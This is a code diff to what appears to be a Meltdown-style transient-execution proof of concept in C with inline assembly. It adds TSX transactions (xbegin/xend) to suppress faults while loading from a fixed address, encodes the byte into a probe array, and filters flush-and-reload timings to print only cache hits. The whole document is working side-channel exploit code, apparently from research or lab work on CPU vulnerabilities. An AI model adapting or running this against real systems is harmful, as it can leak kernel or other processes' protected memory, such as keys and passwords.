@@ -52,7 +52,11 @@ int main(int argc, char **argv) {
         //       making `shl rax, 0xc` zero which avoids side-channel pollution.
         asm volatile ("mfence                           \n\t" // Memory store serialising barrier
                       "lfence                           \n\t" // Memory load and instruction serialising barrier
+
                       "xor rax, rax                     \n\t" // Scrub `rax` for use with `al`
+
+                      "xbegin skip                      \n\t"
+
                       // BEGIN TRANSIENT EXECUTION
                       "retry:                           \n\t"
                       "mov al, BYTE PTR [%0]            \n\t"
@@ -60,7 +64,12 @@ int main(int argc, char **argv) {
                       "jz retry                         \n\t"
                       "mov %1, QWORD PTR [%1 + rax]     \n\t"
                       // END TRANSIENT EXECUTION
-        ::"c" /* rcx */ (&some_data), /* rbx */ "b" (probe_array)
+
+                      "xend                             \n\t"
+
+                      "skip:                            \n\t"
+
+        ::"c" /* rcx */ (0x123), /* rbx */ "b" (probe_array)
         : "rax", "al"
         );
 
@@ -90,7 +99,10 @@ int main(int argc, char **argv) {
         : "eax", "edx" /* used for rdtsc */, "rax", "esi"
         );
 
-        printf("[0x%02x] %u\n", i, time);
+        //printf("[0x%02x] %u\n", i, time);
+        if (time < 400) {
+            printf("[0x%02x] %u\n", i, time);
+        }
     }
 
     return 0;
